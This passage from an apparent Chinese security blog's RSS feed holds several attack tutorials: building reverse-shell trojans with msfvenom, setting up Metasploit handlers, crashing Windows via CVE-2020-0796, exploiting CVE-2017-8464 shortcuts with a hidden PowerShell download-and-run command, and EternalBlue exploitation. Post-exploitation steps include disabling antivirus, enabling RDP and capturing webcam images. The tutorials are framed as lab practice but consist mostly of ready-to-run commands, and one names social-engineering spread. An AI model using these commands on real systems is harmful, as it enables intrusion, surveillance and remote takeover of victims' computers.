&lt;p&gt;配置 payload 监控端口  msf 终端中输入：set lport  {监控端口} （注意这里要和木马配置时使用的端口相同 &amp;amp; 如果使用内网穿透服务填写转发后的端口）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查 payload 配置  msf 终端中输入：show options&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;执行监控  msf 终端中输入： run&lt;/p&gt;
&lt;p&gt;![1643108218621](22 通过木马反弹 shell（Linux）.assets/1643108218621.png)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;四-攻击利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-攻击利用&#34;&gt;#&lt;/a&gt; 四、攻击利用&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;将木马上传到靶机&lt;/p&gt;
&lt;p&gt;通过 python 创建一个简单 web 服务&lt;/p&gt;
&lt;p&gt;python2 -m SimpleHTTPServer 80&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在靶机上执行木马&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;完成攻击利用&lt;/p&gt;
&lt;p&gt;![1643108263211](22 通过木马反弹 shell（Linux）.assets/1643108263211.png)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Windows/</guid>
            <title>生成木马反弹shell_Windows</title>
            <link>https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Windows/</link>
            <pubDate>Thu, 12 Jan 2023 15:49:18 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;生成木马反弹 shell（Windows）&lt;/p&gt;
&lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;MSF-Metasploit Framework&lt;/li&gt;
&lt;li&gt;一台 windiows 靶机&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;二-开始生成木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-开始生成木马&#34;&gt;#&lt;/a&gt; 二、开始生成木马&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;使用 msfvenom 生成木马&lt;/li&gt;
&lt;li&gt;终端内输入:   msfvenom -p windows/meterpreter_reverse_tcp LHOST={监控 IP} LPORT={监控端口} -e x86/shikata_ga_nai  -f exe -o  new.exe -i 5&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.38  LPORT=4567  -e x86/shikata_ga_nai  -f exe -o  shell.exe  -i 5&lt;/p&gt;
&lt;h1 id=&#34;三-配置监控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-配置监控&#34;&gt;#&lt;/a&gt; 三、配置监控&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;启动 msf   终端内输入：msfconsole 启动 msf&lt;img data-src=&#34;%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501758409.png&#34; alt=&#34;1642501758409&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;载入监控模块  msf 中输入： use exploit/multi/handler&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501831818.png&#34; alt=&#34;1642501831818&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;加载 payload  msf 终端中输入：set payload windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置 payload  msf 终端中输入：show options&lt;/p&gt;
&lt;/li&gt;
&lt;li 监控ip&gt;
&lt;p&gt;配置 payload 监控 IP msf 终端中输入： set  lhost &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置 payload 监控端口  msf 终端中输入：set lport  {监控端口} （注意这里要和木马配置时使用的端口相同 &amp;amp; 如果使用内网穿透服务填写转发后的端口）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查 payload 配置  msf 终端中输入：show options &lt;img data-src=&#34;%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501934250.png&#34; alt=&#34;1642501934250&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;执行监控  msf 终端中输入： run&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;四-攻击利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-攻击利用&#34;&gt;#&lt;/a&gt; 四、攻击利用&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;将木马上传到靶机&lt;/li&gt;
&lt;li&gt;在靶机上执行木马&lt;/li&gt;
&lt;li&gt;完成攻击利用&lt;img data-src=&#34;%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501969373.png&#34; alt=&#34;1642501969373&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</guid>
            <title>永恒之黑漏洞利用</title>
            <link>https://mangpumo.github.io/2023/01/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link>
            <pubDate>Thu, 12 Jan 2023 15:37:55 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-cve-2020-0796-永恒之黑漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-cve-2020-0796-永恒之黑漏洞&#34;&gt;#&lt;/a&gt; 一、 CVE-2020-0796 永恒之黑漏洞&lt;/h1&gt;
&lt;p&gt;永恒之黑漏洞与 “永恒之蓝” 漏洞极为相似，都是利用 Windows SMB 漏洞远程攻击获取系统最高权限。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞危害等级：高危&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;“永恒之黑” 漏洞高危之处在于对 SMB 客户端的攻击，攻击者可以通过构造一个 “特制” 的网页、压缩包、共享目录、OFFICE 文档等，向攻击目标发送，一旦被攻击者打开则瞬间触发漏洞受到攻击。&lt;/p&gt;
&lt;p&gt;漏洞成因：&lt;br&gt;
CVE-2020-0796 漏洞存在于受影响版本的 Windows 驱动 srv2.sys 中，由于 Windows SMB 更新到 3.1.1 版本增加了对压缩数据的支持，未对用户传输的压缩数据的合法性进行校验。&lt;/p&gt;
&lt;p&gt;受影响的 Windows 版本&lt;/p&gt;
&lt;p&gt;Windows 10 Version 1903 for 32-bit Systems&lt;br&gt;
Windows 10 Version 1903 for ARM64-based Systems&lt;br&gt;
Windows 10 Version 1903 for x64-based Systems&lt;br&gt;
Windows 10 Version 1909 for 32-bit Systems&lt;br&gt;
Windows 10 Version 1909 for ARM64-based Systems&lt;br&gt;
Windows 10 Version 1909 for x64-based Systems&lt;br&gt;
Windows Server, version 1903 (Server Core installation)&lt;br&gt;
Windows Server, version 1909 (Server Core installation)&lt;/p&gt;
&lt;h1 id=&#34;二-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-环境准备&#34;&gt;#&lt;/a&gt; 二、环境准备&lt;/h1&gt;
&lt;p&gt;1 一个受影响的 windows 版本&lt;/p&gt;
&lt;p&gt;2  正常的电脑&lt;/p&gt;
&lt;h1 id=&#34;三-开始利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-开始利用&#34;&gt;#&lt;/a&gt; 三、开始利用&lt;/h1&gt;
&lt;p&gt;首先确认当前作为靶机的 Windows 系统是受影响的版本&lt;/p&gt;
&lt;p&gt;Windows 版本，按 win+r，在弹出运行窗口中，输入 winver&lt;/p&gt;
&lt;p&gt;![1642062038435](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062038435.png)&lt;/p&gt;
&lt;h2 id=&#34;1-漏洞发现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-漏洞发现&#34;&gt;#&lt;/a&gt; 1、 漏洞发现&lt;/h2&gt;
&lt;p&gt;![1642062059301](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062059301.png)&lt;/p&gt;
&lt;p&gt;使用奇安信的漏洞探测工具&lt;/p&gt;
&lt;p&gt;直接在 cmd 中启动  CVE-2020-0796-Scanner.exe&lt;/p&gt;
&lt;p&gt;根据提示输入扫描目标 IP 或者扫描 IP 范围&lt;/p&gt;
&lt;p&gt;![1642062077901](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062077901.png)&lt;/p&gt;
&lt;h2 id=&#34;2-准备蓝屏payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-准备蓝屏payload&#34;&gt;#&lt;/a&gt; 2、准备蓝屏 payload&lt;/h2&gt;
&lt;p&gt;![1642062098119](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062098119.png)&lt;/p&gt;
&lt;p&gt;使用 CVE-2020-0796 蓝屏工具进行攻击&lt;/p&gt;
&lt;p&gt;python3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0NWRS0yMDIwLTA3OTYucHk=&#34;&gt;CVE-2020-0796.py&lt;/span&gt;  &lt;code&gt;&amp;lt;查询到存在漏洞的IP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;python3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0NWRS0yMDIwLTA3OTYucHk=&#34;&gt;CVE-2020-0796.py&lt;/span&gt;  192.168.3.38&lt;/p&gt;
&lt;p&gt;如果靶机没有蓝屏就重新攻击一下&lt;/p&gt;
&lt;p&gt;![1642062112224](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062112224.png)&lt;/p&gt;
&lt;p&gt;扩展阅读：&lt;/p&gt;
&lt;p&gt;微软披露了一个最新的 SMBv3 (3.1.1) 远程代码执行漏洞 (CVE-2020-0796)，俗称 “永恒之黑”。本漏洞源于 SMBv3 没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。利用该漏洞，攻击方可直接远程攻击 SMB 服务端远程执行任意恶意代码，亦可通过构建恶意 SMB 服务端诱导客户端连接从而大规模攻击客户端。永恒之黑一旦被成功利用，其危害不亚于永恒之蓝。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E9%9C%87%E7%BD%91%E4%B8%89%E4%BB%A3%E5%8F%8D%E5%BC%B9shell/</guid>
            <title>震网三代反弹shell</title>
            <link>https://mangpumo.github.io/2023/01/12/%E9%9C%87%E7%BD%91%E4%B8%89%E4%BB%A3%E5%8F%8D%E5%BC%B9shell/</link>
            <pubDate>Thu, 12 Jan 2023 15:30:47 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-什么是-cve-2017-8464&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-什么是-cve-2017-8464&#34;&gt;#&lt;/a&gt; 一、 什么是 CVE-2017-8464：&lt;/h1&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;2017 年 6 月 13 日，微软官方发布编号为 CVE-2017-8464 的漏洞公告，官方介绍 Windows 系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过 U 盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危&lt;/p&gt;
&lt;p&gt;传播的载体一般是 LNK ，LNK 是 windows 系统内应用程序快捷方式文件的文件类型后缀名。&lt;/p&gt;
&lt;p&gt;危害：&lt;/p&gt;
&lt;p&gt;被攻击机插入存在攻击 lnk 的 U 盘后会反弹 shell，哪怕是被隔离的内网，也可以在不上网的情况下被攻击。&lt;/p&gt;
&lt;h1 id=&#34;二-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-环境准备&#34;&gt;#&lt;/a&gt; 二、环境准备：&lt;/h1&gt;
&lt;p&gt;1 可复现的操作系统版本：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Microsoft Windows 10 Version 1607 for 32-bit Systems&lt;/li&gt;
&lt;li&gt;Microsoft Windows 10 Version 1607 for x64-based Systems&lt;/li&gt;
&lt;li&gt;Microsoft Windows 10 for 32-bit Systems&lt;/li&gt;
&lt;li&gt;Microsoft Windows 10 for x64-based Systems&lt;/li&gt;
&lt;li&gt;Microsoft Windows 10 version 1511 for 32-bit Systems&lt;/li&gt;
&lt;li&gt;Microsoft Windows 10 version 1511 for x64-based Systems&lt;/li&gt;
&lt;li&gt;Microsoft Windows 10 version 1703 for 32-bit Systems&lt;/li&gt;
&lt;li&gt;Microsoft Windows 10 version 1703 for x64-based Systems&lt;/li&gt;
&lt;li&gt;Microsoft Windows 7 for 32-bit Systems SP1&lt;/li&gt;
&lt;li&gt;Microsoft Windows 7 for x64-based Systems SP1&lt;/li&gt;
&lt;li&gt;Microsoft Windows 8.1 for 32-bit Systems&lt;/li&gt;
&lt;li&gt;Microsoft Windows 8.1 for x64-based Systems&lt;/li&gt;
&lt;li&gt;Microsoft Windows RT 8.1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2 可复现的服务器系统版本：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1&lt;/li&gt;
&lt;li&gt;Microsoft Windows Server 2008 R2 for x64-based Systems SP1&lt;/li&gt;
&lt;li&gt;Microsoft Windows Server 2008 for 32-bit Systems SP2&lt;/li&gt;
&lt;li&gt;Microsoft Windows Server 2008 for Itanium-based Systems SP2&lt;/li&gt;
&lt;li&gt;Microsoft Windows Server 2008 for x64-based Systems SP2&lt;/li&gt;
&lt;li&gt;Microsoft Windows Server 2012&lt;/li&gt;
&lt;li&gt;Microsoft Windows Server 2012 R2&lt;/li&gt;
&lt;li&gt;Microsoft Windows Server 2016&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3 kali 操作系统&lt;/p&gt;
&lt;h1 id=&#34;三-利用原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-利用原理&#34;&gt;#&lt;/a&gt; &lt;strong&gt;三、利用原理&lt;/strong&gt; ：&lt;/h1&gt;
&lt;p&gt;创建恶意快捷方式，包含恶意执行脚本，点击恶意快捷方式，导致本机中病毒，并且被远控。&lt;/p&gt;
&lt;h1 id=&#34;四-实战利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-实战利用&#34;&gt;#&lt;/a&gt; 四、实战利用&lt;/h1&gt;
&lt;p&gt;启动 MSF&lt;/p&gt;
&lt;p&gt;终端内输入：msfconsole&lt;/p&gt;
&lt;p&gt;开始利用：&lt;/p&gt;
&lt;h4 id=&#34;1-使用msf创建一个后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-使用msf创建一个后门&#34;&gt;#&lt;/a&gt; 1、使用 MSF 创建一个后门&lt;/h4&gt;
&lt;p&gt;msf 内输入：&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.3.23 lport=4456 -f psh-reflection&amp;gt;/var/www/html/link.ps1&lt;/p&gt;
&lt;h4 id=&#34;2-在kali下开启apache2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-在kali下开启apache2&#34;&gt;#&lt;/a&gt; 2、在 kali 下开启 apache2&lt;/h4&gt;
&lt;p&gt;终端内输入：service apache2 start&lt;/p&gt;
&lt;h4 id=&#34;3-通过社会学进行快捷方式传播&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-通过社会学进行快捷方式传播&#34;&gt;#&lt;/a&gt; 3、通过社会学进行快捷方式传播&lt;/h4&gt;
&lt;p&gt;powershell -windowstyle hidden -exec bypass -c &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMjA0LjEzNS9saW5rLnBzMQ==&#34;&gt;http://192.168.204.135/link.ps1&lt;/span&gt;&#39;);test.ps1&amp;quot;&lt;/p&gt;
&lt;p&gt;![1641972171811](一、 什么是 CVE-2017-8464：.assets/1641972171811.png)&lt;/p&gt;
&lt;p&gt;![1641972183309](一、 什么是 CVE-2017-8464：.assets/1641972183309.png)&lt;/p&gt;
&lt;h4 id=&#34;4-回到msf终端配置监听&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-回到msf终端配置监听&#34;&gt;#&lt;/a&gt; 4 回到 MSF 终端配置监听&lt;/h4&gt;
&lt;p&gt;msf 内输入：  use exploit/multi/handler&lt;/p&gt;
&lt;h4 id=&#34;5-配置payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-配置payload&#34;&gt;#&lt;/a&gt; 5 配置 payload&lt;/h4&gt;
&lt;p&gt;set payload windows/x64/meterpreter/reverse_tcp&lt;/p&gt;
&lt;p&gt;![1641972198597](一、 什么是 CVE-2017-8464：.assets/1641972198597.png)&lt;/p&gt;
&lt;p&gt;msf 中输入 ： show options   配置 payload&lt;/p&gt;
&lt;p&gt;![1641972211876](一、 什么是 CVE-2017-8464：.assets/1641972211876.png)&lt;/p&gt;
&lt;p&gt;设置 LHOST  和  LPORT&lt;/p&gt;
&lt;p&gt;maf 中输入：&lt;/p&gt;
&lt;p&gt;5.1  set lhost  &lt;code&gt;&amp;lt;当前机器ip&amp;gt;&lt;/code&gt;  设置 LHOST&lt;/p&gt;
&lt;p&gt;5.2  set lport   &lt;code&gt;&amp;lt;未被占用的端口&amp;gt;&lt;/code&gt;   设置 LPORT&lt;/p&gt;
&lt;p&gt;![1641972223277](一、 什么是 CVE-2017-8464：.assets/1641972223277.png)&lt;/p&gt;
&lt;p&gt;5.3  最后在 输入 show options 查看配置是否生效&lt;/p&gt;
&lt;p&gt;![1641972233527](一、 什么是 CVE-2017-8464：.assets/1641972233527.png)&lt;/p&gt;
&lt;h4 id=&#34;6-执行监听&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6-执行监听&#34;&gt;#&lt;/a&gt; 6、执行监听&lt;/h4&gt;
&lt;p&gt;msf 中输入 ： run 或者  exploit&lt;/p&gt;
&lt;p&gt;![1641972244295](一、 什么是 CVE-2017-8464：.assets/1641972244295.png)&lt;/p&gt;
&lt;p&gt;进入靶机执行我们在靶机上创建的快捷方式&lt;/p&gt;
&lt;p&gt;![1641972183309](一、 什么是 CVE-2017-8464：.assets/1641972183309.png)&lt;/p&gt;
&lt;p&gt;稍等片刻获取到 meterpreter&lt;/p&gt;
&lt;p&gt;![1641972268406](一、 什么是 CVE-2017-8464：.assets/1641972268406.png)&lt;/p&gt;
&lt;h1 id=&#34;五-后渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#五-后渗透&#34;&gt;#&lt;/a&gt; 五、后渗透&lt;/h1&gt;
&lt;p&gt;1、通过快捷方式执行程序&lt;/p&gt;
&lt;p&gt;meterpreter 中输入  shell&lt;/p&gt;
&lt;p&gt;![1641972283719](一、 什么是 CVE-2017-8464：.assets/1641972283719.png)&lt;/p&gt;
&lt;p&gt;发现 shell 显示有乱码&lt;/p&gt;
&lt;p&gt;shell 内输入  chcp 65001&lt;/p&gt;
&lt;p&gt;![1641972295944](一、 什么是 CVE-2017-8464：.assets/1641972295944.png)&lt;/p&gt;
&lt;p&gt;然后进入 desktop 目录（这个是 win 的桌面）&lt;/p&gt;
&lt;p&gt;根据实际情况拼路径&lt;/p&gt;
&lt;p&gt;shell 里输入：cd users/mb/desktop&lt;/p&gt;
&lt;p&gt;![1641972307789](一、 什么是 CVE-2017-8464：.assets/1641972307789.png)&lt;/p&gt;
&lt;p&gt;2 更多操作&lt;/p&gt;
&lt;p&gt;查看进程：ps&lt;br&gt;
 查看当前进程号：getpid&lt;br&gt;
 查看系统信息：sysinfo&lt;br&gt;
 查看目标机是否为虚拟机：run post/windows/gather/checkvm&lt;br&gt;
 查看完整网络设置：route&lt;br&gt;
 查看当前权限：getuid&lt;br&gt;
 自动提权：getsystem&lt;br&gt;
 关闭杀毒软件：run post/windows/manage/killav&lt;br&gt;
 启动远程桌面协议：run post/windows/manage/enable_rdp&lt;br&gt;
 列举当前登录的用户：run post/windows/gather/enum_logged_on_users&lt;br&gt;
 查看当前应用程序：run post/windows/gather/enum_applications&lt;br&gt;
 抓取目标机的屏幕截图：load espia ； screengrab&lt;br&gt;
 抓取摄像头的照片：webcam_snap&lt;br&gt;
 查看当前处于目标机的那个目录：pwd&lt;br&gt;
 查看当前目录：getlwd&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/2017%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</guid>
            <title>2017永恒之蓝漏洞利用</title>
            <link>https://mangpumo.github.io/2023/01/12/2017%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link>
            <pubDate>Thu, 12 Jan 2023 15:19:32 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; &lt;strong&gt;一、 环境准备&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;1 一台 Windows 电脑&lt;/p&gt;
&lt;p&gt;（可以使用虚拟机代替）&lt;/p&gt;
&lt;h3 id=&#34;2-metasploit任意平台&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-metasploit任意平台&#34;&gt;#&lt;/a&gt; 2 Metasploit 任意平台&lt;/h3&gt;
&lt;p&gt;可以是 Windows 版，可以是 kali 自带版&lt;/p&gt;
&lt;h1 id=&#34;二-cve-2017-0144-介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-cve-2017-0144-介绍&#34;&gt;#&lt;/a&gt; &lt;strong&gt;二、&lt;/strong&gt; CVE-2017-0144 介绍&lt;/h1&gt;
&lt;p&gt;1. 何为 CVE-2017-0144？&lt;/p&gt;
&lt;p&gt;​    CVE-2017-0144 既 永恒之蓝最早爆发于 2017 年 4 月 14 日晚，是一种利用 Windows 系统的 SMB 协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于 2017 年 5 月 12 日， 不法分子通过改造 “永恒之蓝” 制作了勒索病毒，使全世界大范围内遭受了勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。&lt;/p&gt;
&lt;p&gt;2. 什么是 SMB 协议？&lt;/p&gt;
&lt;p&gt;SMB 是一个协议服务器信息块，它是一种客户机 / 服务器、请求 / 响应协议，通过 SMB 协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠 SMB 实现的；SMB 协议工作在应用层和会话层，可以用在 TCP/IP 协议之上，SMB 使用 TCP139 端口和 TCP445 端口。&lt;/p&gt;
&lt;p&gt;3.SMB 工作原理是什么？&lt;/p&gt;
&lt;p&gt;（1）：首先客户端发送一个 SMB negport 请求数据报，，并列出它所支持的所有 SMB 的协议版本。服务器收到请求消息后响应请求，并列出希望使用的 SMB 协议版本。如果没有可以使用的协议版本则返回 0XFFFFH，结束通信。&lt;/p&gt;
&lt;p&gt;（2）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送 SessetupX 请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个 SessetupX 应答数据包来允许或拒绝本次连接。&lt;/p&gt;
&lt;p&gt;（3）：当客户端和服务器完成了磋商和认证之后，它会发送一个 Tcon 或 TconX SMB 数据报并列出它想访问的网络资源的名称，之后会发送一个 TconX 应答数据报以表示此次连接是否接收或拒绝。&lt;/p&gt;
&lt;p&gt;（4）：连接到相应资源后，SMB 客户端就能够通过 open SMB 打开一个文件，通过 read SMB 读取文件，通过 write SMB 写入文件，通过 close SMB 关闭文件。&lt;/p&gt;
&lt;h1 id=&#34;三-原理-永恒之蓝是在windows的smb服务处理smb-v1请求时发生的漏洞这个漏洞导致攻击者在目标系统上可以执行任意代码-通过永恒之蓝漏洞会扫描开放445文件共享端口的windows机器无需用户任何操作只要开机上网不法分子就能在电脑和服务器中植入勒索软件-远程控制木马-虚拟货币挖矿机等恶意程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-原理-永恒之蓝是在windows的smb服务处理smb-v1请求时发生的漏洞这个漏洞导致攻击者在目标系统上可以执行任意代码-通过永恒之蓝漏洞会扫描开放445文件共享端口的windows机器无需用户任何操作只要开机上网不法分子就能在电脑和服务器中植入勒索软件-远程控制木马-虚拟货币挖矿机等恶意程序&#34;&gt;#&lt;/a&gt; &lt;strong&gt;三、原理&lt;/strong&gt;     永恒之蓝是在 Windows 的 SMB 服务处理 SMB v1 请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放 445 文件共享端口的 Windows 机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。&lt;/h1&gt;
&lt;h1 id=&#34;四-cve-2017-0144-利用方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-cve-2017-0144-利用方法&#34;&gt;#&lt;/a&gt; &lt;strong&gt;四、CVE-2017-0144 利用方法&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;1  启动 Metasploit&lt;/p&gt;
&lt;p&gt;终端里输入 msfconsole&lt;/p&gt;
&lt;p&gt;2 查询利用模块&lt;/p&gt;
&lt;p&gt;终端里输入 search ms17_010&lt;/p&gt;
&lt;p&gt;a&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/960ae38818084260be8eb69e589edba4.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;3 使用探测模块&lt;/p&gt;
&lt;p&gt;终端内输入  use auxiliary/scanner/smb/smb_ms17_010&lt;/p&gt;
&lt;p&gt;4 设置探测范围&lt;/p&gt;
&lt;p&gt;终端内输入  show options&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/ab7ca3d4ba774677bc2a239c420349f7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;上图中我们可以看到是需要配置一个 RHOSTS&lt;/p&gt;
&lt;p&gt;终端内输入  set rhosts  192.168.3.0/24  （设置扫描当前网段  可以通过 在终端内输入 ip a 查看）&lt;/p&gt;
&lt;p&gt;也可以设置范围 set rhosts 192.168.3.1-192.168.3.10&lt;/p&gt;
&lt;p&gt;5 开始探测&lt;/p&gt;
&lt;p&gt;终端内输入  run 执行探测&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/7df1f73ea464404091de9c13d885c139.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据上图我们可以看到 192.168.3.8 这个 IP 的机器可能存在漏洞&lt;/p&gt;
&lt;p&gt;6 开始漏洞利用&lt;/p&gt;
&lt;p&gt;开始利用首先在终端里输入&lt;br&gt;
 search ms17_010&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/8bf107d057a34676984a5d5e8b9bae73.png&#34; alt=&#34;img&#34;&gt;&lt;br&gt;
 使用 模块&lt;br&gt;
 use  exploit/windows/smb/ms17_010_eternalblue&lt;/p&gt;
&lt;p&gt;7 配置利用模块&lt;/p&gt;
&lt;p&gt;配置模块&lt;br&gt;
 show options&lt;br&gt;
 配置靶机&lt;br&gt;
 set rhost 192.168.3.8  这里 IP 填第五步探测到的 IP&lt;/p&gt;
&lt;p&gt;8 执行攻击&lt;/p&gt;
&lt;p&gt;在终端里输入  run&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/8a0c81062f424c7682a329503a315313.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;知道咱们看到 win  则攻击成功 拿到 meterpreter&lt;/p&gt;
&lt;p&gt;9 后渗透操作&lt;/p&gt;
&lt;p&gt;查看进程：ps&lt;br&gt;
 查看当前进程号：getpid&lt;br&gt;
 查看系统信息：sysinfo&lt;br&gt;
 查看目标机是否为虚拟机：run post/windows/gather/checkvm&lt;br&gt;
 查看完整网络设置：route&lt;br&gt;
 查看当前权限：getuid&lt;br&gt;
 自动提权：getsystem&lt;br&gt;
